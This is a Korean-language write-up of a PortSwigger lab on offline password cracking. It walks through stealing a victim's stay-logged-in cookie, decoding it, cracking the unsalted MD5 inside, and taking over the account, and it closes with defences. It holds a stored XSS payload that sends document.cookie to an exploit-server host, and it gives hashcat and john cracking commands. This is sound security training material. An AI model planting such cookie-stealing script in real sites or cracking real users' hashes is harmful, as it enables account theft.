# Lab: Offline password cracking

## 개요

- **난이도**: Practitioner
- **주제**: Authentication — 유지 로그인 쿠키 유출 / 오프라인 비밀번호 크래킹 / MD5(솔트 없음)
- **링크**: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

## 목표

댓글 기능의 XSS 로 `carlos` 의 `stay-logged-in` 쿠키를 탈취하고, 쿠키에 담긴 MD5 해시를 오프라인으로 크랙해 비밀번호를 얻는다. `carlos` 로 로그인한 뒤 `My account` 에서 계정을 삭제한다.

- 내 계정: `wiener:peter`
- 피해자: `carlos`

## 취약점 체인

```
1) 저장형 XSS (댓글)           → 피해자 브라우저에서 스크립트 실행
2) document.cookie 탈취        → stay-logged-in 쿠키 유출
3) 쿠키 구조: base64(user:md5(password))
4) MD5 + 솔트 없음             → 오프라인 사전 공격으로 평문 복구
5) 비밀번호로 로그인           → carlos 계정 장악
```

009(쿠키 brute-force)와 달리, 여기서는 **쿠키를 먼저 탈취한 뒤 오프라인에서 해시를 크랙**한다.

## 취약 지점

### 1. 댓글 기능의 저장형 XSS

```
<script>document.location='//EXPLOIT-SERVER/'+document.cookie</script>
```

관리자/피해자가 댓글을 열람하면 `document.cookie` 가 공격자 서버로 전송된다.

### 2. 쿠키에 비밀번호 해시 저장

```
stay-logged-in = base64("carlos:26323c16d5f4dabff3bb136f2460a943")
디코딩         = carlos:26323c16d5f4dabff3bb136f2460a943
                 └──────────────┬──────────────┘
                          md5("onceuponatime")
```

### 3. MD5 + 솔트 없음

```
- 알고리즘 노출(MD5), 솔트 없음
- 동일 비밀번호 → 항상 동일 해시
- 사전/레인보우 테이블/온라인 검색으로 복구 가능
```

## 공격 단계

### 1단계 — 쿠키 구조 확인

자기 계정으로 **Stay logged in** 로그인 후 쿠키를 디코딩한다.

```
stay-logged-in → base64 디코딩 → wiener:<md5>
```

### 2단계 — XSS 로 피해자 쿠키 탈취

익스플로잇 서버 URL 을 확인하고, 블로그 댓글에 저장형 XSS 를 게시한다.

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

익스플로잇 서버 **Access log** 에 피해자의 요청과 `stay-logged-in` 쿠키가 남는다.

### 3단계 — 쿠키 디코딩

```
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
  → carlos:26323c16d5f4dabff3bb136f2460a943
```

### 4단계 — 오프라인 크랙

해시를 워드리스트로 대입해 평문을 찾는다.

```
md5("onceuponatime") = 26323c16d5f4dabff3bb136f2460a943
→ 비밀번호: onceuponatime
```

### 5단계 — 로그인 및 계정 삭제

`carlos:onceuponatime` 로 로그인 → `My account` → 계정 삭제 → 랩 해결.

## 자동화 툴 — hash-cracker.py

`tools/hash-cracker.py` 로 디코딩·크랙을 수행한다.

```bash
# 쿠키 디코딩만
python3 tools/hash-cracker.py \
  --decode-cookie "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz"

# 디코딩 + 워드리스트 크랙
python3 tools/hash-cracker.py \
  --cookie "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz" \
  --wordlist rockyou.txt

# 해시 직접 / 알고리즘 / 솔트
python3 tools/hash-cracker.py --hash 26323c16d5f4dabff3bb136f2460a943 \
  --wordlist rockyou.txt --algo md5 --prefix "carlos:"

# 여러 해시 파일 (각 줄: label:hash)
python3 tools/hash-cracker.py --hash-file hashes.txt --wordlist rockyou.txt

# PortSwigger 후보 목록 사용
python3 tools/hash-cracker.py --hash <md5> --portswigger
```

```
지원: --decode-cookie(추출), --hash/--cookie/--hash-file, --algo md5|sha1|sha256|sha512,
      --prefix/--suffix(솔트), --wordlist(파일/URL/인라인), --portswigger
```

### 실제 크래킹 도구 (실무)

```
[hashcat — GPU 가속, 대량/고속]
  MD5(솔트 없음), 사전 공격:
    hashcat -m 0 -a 0 hash.txt rockyou.txt
  규칙 적용:
    hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule
  마스크(브루트) 공격:
    hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

[john the ripper — CPU, 다양한 포맷]
    john --format=raw-md5 --wordlist=rockyou.txt hash.txt

[온라인 검색]
  공개 해시 DB/검색엔진에 해시를 조회 (실제 고객 해시 업로드 금지!)
```

### 검증 메모

`tools/hash-cracker.py` 검증 결과:

```
--decode-cookie  → carlos:26323c16d5f4dabff3bb136f2460a943
--hash 그 값 --wordlist "foo,onceuponatime,bar" → onceuponatime (md5=26323c16...)
--hash md5("sunshine") --portswigger → sunshine
```

## 방어

```
[근본 원인 1 — 쿠키 탈취]
  댓글 저장형 XSS (출력 인코딩/살균 부재)

[근본 원인 2 — 오프라인 크랙 가능]
  쿠키에 솔트 없는 MD5(비밀번호 해시)를 담음

[올바른 방어]
  1. XSS 방지
     - 모든 사용자 입력 출력 시 컨텍스트에 맞게 인코딩/이스케이프
     - CSP 적용, 입력 검증/살균
  2. 쿠키에 비밀번호/해시를 담지 않음
     - 서버 측 무작위 토큰 + 매핑, 만료/회전/폐기
     - HttpOnly(스크립트 접근 차단), Secure, SameSite
  3. 비밀번호는 솔트 + 강한 해시로 저장
     - bcrypt / scrypt / Argon2 (MD5/SHA 단독 금지)
     - 사용자별 고유 솔트 + 충분한 작업 계수
  4. 유출 가정 대응
     - 비밀번호 재사용 금지 정책, 유출 비밀번호 차단
     - MFA 적용

[주의]
  쿠키에 HttpOnly 가 없으면 XSS 한 번으로 인증 토큰이 그대로 유출된다.
  설령 토큰을 탈취당해도, 담긴 정보가 오프라인 크랙 가능한 해시여서는 안 된다.
```

## 핵심 정리

- 댓글 저장형 XSS 로 `carlos` 의 `stay-logged-in` 쿠키를 탈취했다.
- 쿠키가 `base64("carlos:" + md5(password))` 형식이라 디코딩 후 MD5 를 오프라인 크랙해 `onceuponatime` 을 얻었다.
- 그 자격증명으로 로그인해 `carlos` 계정을 삭제했다.
- 방어는 XSS 차단 + 쿠키에 비밀번호 해시를 담지 않음 + 솔트 있는 강한 해시 저장이다.

## 배운 점

- 취약점은 단일이 아니라 체인(XSS → 쿠키 유출 → 오프라인 크랙 → 계정 장악)으로 이어진다.
- 솔트 없는 MD5 는 사실상 평문에 준하며, 오프라인 환경에서는 시도 제한이 없어 GPU 로 대량 대입이 가능하다.
- 009 는 쿠키를 온라인으로 brute-force 했고, 010 은 쿠키를 탈취해 **오프라인**에서 크랙했다는 차이가 있다.
- 이 랩을 위해 `tools/hash-cracker.py`(디코딩 + 사전 크랙)를 작성하고, 실무 도구(hashcat/john) 사용법을 함께 정리했다.
